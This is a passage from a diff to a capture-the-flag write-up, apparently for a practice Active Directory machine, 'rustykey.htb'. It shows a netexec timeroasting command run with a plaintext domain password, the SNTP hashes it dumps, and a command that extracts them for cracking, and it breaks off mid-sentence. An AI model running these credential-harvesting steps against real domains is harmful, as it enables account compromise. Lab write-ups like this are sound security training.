@@ -170,5 +170,48 @@ There is also no passwords stored in user descriptions
 # Timeroasting leads to user compromise
 
 ```python
-
+ ❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k -M timeroast
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
+TIMEROAST   dc.rustykey.htb 445    dc               [*] Starting Timeroasting...
+TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$58e42695e13793a7ac09c2a96571fd30$1c0111e900000000000a04a34c4f434cee7ea5eff7feff4fe1b8428bffbfcd0aee7eac0cf7feda66ee7eac0cf7ff0cba
+TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$b9ecbbe1fe43365209086cedcb320f70$1c0111e900000000000a04a34c4f434cee7ea5eff7e806e4e1b8428bffbfcd0aee7eac0d97e7e8b2ee7eac0d97e812a3
+TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$e22c65382d88ff6ff5593d10efe5b74a$1c0111e900000000000a04a34c4f434cee7ea5eff96fdddee1b8428bffbfcd0aee7eac0d996fbdfdee7eac0d996fe99c
+TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$4d3f8d25065b35f591bf560f847a7d5e$1c0111e900000000000a04a34c4f434cee7ea5eff727b11ee1b8428bffbfcd0aee7eac0d9b40280eee7eac0d9b4051ff
+TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$56e030f220b985fbcbe79d6f19ce71da$1c0111e900000000000a04a34c4f434cee7ea5eff824935de1b8428bffbfcd0aee7eac0d9c3d145dee7eac0d9c3d30e2
+TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$863543b1fcdd02fdd9a55a18970e2573$1c0111e900000000000a04a34c4f434cee7ea5eff8ff7596e1b8428bffbfcd0aee7eac0d9d17f18eee7eac0d9d1819d2
+TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$21c5417ce9739758e1bb2755a10facc9$1c0111e900000000000a04a34c4f434cee7ea5eff83963cee1b8428bffbfcd0aee7eac0dac7298a3ee7eac0dac72c94b
+TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$ffc976752793ac99eff55dc78838c595$1c0111e900000000000a04a34c4f434cee7ea5eff98e5dfce1b8428bffbfcd0aee7eac0dadc79123ee7eac0dadc7c1cb
+TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$4bb96160951b16621f0b50c373983c14$1c0111e900000000000a04a34c4f434cee7ea5eff743576de1b8428bffbfcd0aee7eac0daf539ee3ee7eac0daf53c579
+TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$2f14d3aab8cf9a3612d8347a87422289$1c0111e900000000000a04a34c4f434cee7ea5eff8514211e1b8428bffbfcd0aee7eac0db0618987ee7eac0db061b01e
+TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$0899d0c314f856d070833104651045fd$1c0111e900000000000a04a34c4f434cee7ea5eff9ca247be1b8428bffbfcd0aee7eac0db1da5cd8ee7eac0db1da95e3
+TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$09101e4d745c7ff6d6b6e4c34cc1ff3b$1c0111e900000000000a04a34c4f434cee7ea5eff6fee045e1b8428bffbfcd0aee7eac0db327aa68ee7eac0db327e6ce
+TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$d663347313b12ddac598da83a9ebe137$1c0111e900000000000a04a34c4f434cee7ea5eff8103a09e1b8428bffbfcd0aee7eac0db4390936ee7eac0db4394240
+TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6
+TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$af472fe1eb42690da7f6d367afaf4de9$1c0111e900000000000a04a34c4f434cee7ea5eff7115d1fe1b8428bffbfcd0aee7eac0db7114247ee7eac0db7116a8b
+TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5eff7f5290ce1b8428bffbfcd0aee7eac0db7f50e34ee7eac0db7f53678
 ```
+
+This has dumped several hashes out
+
+```python
+❯❯❯ cat timeroast.out | cut -d ':' -f 2 | tee timeroast.hash
+$sntp-ms$58e42695e13793a7ac09c2a96571fd30$1c0111e900000000000a04a34c4f434cee7ea5eff7feff4fe1b8428bffbfcd0aee7eac0cf7feda66ee7eac0cf7ff0cba
+$sntp-ms$b9ecbbe1fe43365209086cedcb320f70$1c0111e900000000000a04a34c4f434cee7ea5eff7e806e4e1b8428bffbfcd0aee7eac0d97e7e8b2ee7eac0d97e812a3
+$sntp-ms$e22c65382d88ff6ff5593d10efe5b74a$1c0111e900000000000a04a34c4f434cee7ea5eff96fdddee1b8428bffbfcd0aee7eac0d996fbdfdee7eac0d996fe99c
+$sntp-ms$4d3f8d25065b35f591bf560f847a7d5e$1c0111e900000000000a04a34c4f434cee7ea5eff727b11ee1b8428bffbfcd0aee7eac0d9b40280eee7eac0d9b4051ff
+$sntp-ms$56e030f220b985fbcbe79d6f19ce71da$1c0111e900000000000a04a34c4f434cee7ea5eff824935de1b8428bffbfcd0aee7eac0d9c3d145dee7eac0d9c3d30e2
+$sntp-ms$863543b1fcdd02fdd9a55a18970e2573$1c0111e900000000000a04a34c4f434cee7ea5eff8ff7596e1b8428bffbfcd0aee7eac0d9d17f18eee7eac0d9d1819d2
+$sntp-ms$21c5417ce9739758e1bb2755a10facc9$1c0111e900000000000a04a34c4f434cee7ea5eff83963cee1b8428bffbfcd0aee7eac0dac7298a3ee7eac0dac72c94b
+$sntp-ms$ffc976752793ac99eff55dc78838c595$1c0111e900000000000a04a34c4f434cee7ea5eff98e5dfce1b8428bffbfcd0aee7eac0dadc79123ee7eac0dadc7c1cb
+$sntp-ms$4bb96160951b16621f0b50c373983c14$1c0111e900000000000a04a34c4f434cee7ea5eff743576de1b8428bffbfcd0aee7eac0daf539ee3ee7eac0daf53c579
+$sntp-ms$2f14d3aab8cf9a3612d8347a87422289$1c0111e900000000000a04a34c4f434cee7ea5eff8514211e1b8428bffbfcd0aee7eac0db0618987ee7eac0db061b01e
+$sntp-ms$0899d0c314f856d070833104651045fd$1c0111e900000000000a04a34c4f434cee7ea5eff9ca247be1b8428bffbfcd0aee7eac0db1da5cd8ee7eac0db1da95e3
+$sntp-ms$09101e4d745c7ff6d6b6e4c34cc1ff3b$1c0111e900000000000a04a34c4f434cee7ea5eff6fee045e1b8428bffbfcd0aee7eac0db327aa68ee7eac0db327e6ce
+$sntp-ms$d663347313b12ddac598da83a9ebe137$1c0111e900000000000a04a34c4f434cee7ea5eff8103a09e1b8428bffbfcd0aee7eac0db4390936ee7eac0db4394240
+$sntp-ms$890ca6c9c139f7f2d3c6ac3d2b7eb415$1c0111e900000000000a04a34c4f434cee7ea5eff9ba4002e1b8428bffbfcd0aee7eac0db5e310dbee7eac0db5e349e6
+$sntp-ms$af472fe1eb42690da7f6d367afaf4de9$1c0111e900000000000a04a34c4f434cee7ea5eff7115d1fe1b8428bffbfcd0aee7eac0db7114247ee7eac0db7116a8b
+$sntp-ms$e2796824b459f246f17d6c9300da4aac$1c0111e900000000000a04a34c4f434cee7ea5eff7f5290ce1b8428bffbfcd0aee7eac0db7f50e34ee7eac0db7f53678
+```
+
+I placed the output i nto
